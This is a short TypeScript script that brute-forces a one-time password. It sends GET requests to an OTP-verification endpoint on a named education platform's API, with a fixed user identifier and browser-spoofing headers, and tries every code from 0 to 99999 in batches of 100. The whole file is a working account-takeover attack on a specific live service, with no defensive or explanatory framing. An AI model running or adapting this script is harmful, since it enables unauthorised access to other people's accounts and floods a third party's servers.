import axios from "axios";

async function SendRequest(otp:string) {

    let config = {
      method: 'get',
      maxBodyLength: Infinity,
      url: 'https://harkiratapi.classx.co.in/get/otpverify?useremail=8375091349&otp='+ otp,
      headers: { 
        'accept': '*/*', 
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8', 
        'auth-key': 'appxapi', 
        'client-service': 'Appx', 
        'device-type': '', 
        'origin': 'https://harkirat.classx.co.in', 
        'priority': 'u=1, i', 
        'referer': 'https://harkirat.classx.co.in/', 
        'sec-ch-ua': '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"', 
        'sec-ch-ua-mobile': '?1', 
        'sec-ch-ua-platform': '"Android"', 
        'sec-fetch-dest': 'empty', 
        'sec-fetch-mode': 'cors', 
        'sec-fetch-site': 'same-site', 
        'source': 'website', 
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36'
      }
    };
    try{

        await axios.request(config)
    }catch(err){
        console.log(err);
    }
}

async function  main() {
     const p=[];// this will create  a  array whcich will contion all the proise that are send in the 100;s batches    
    for(let i=0;i<100000;i+=100){
        console.log(i);
        for (let j=0;j<100;j++){
                p.push(SendRequest((i+j).toString()));
        }
        await Promise.all(p);// this will make sure all the proimse are resolved in the array and then the next 100batch comes
    }
} 
main();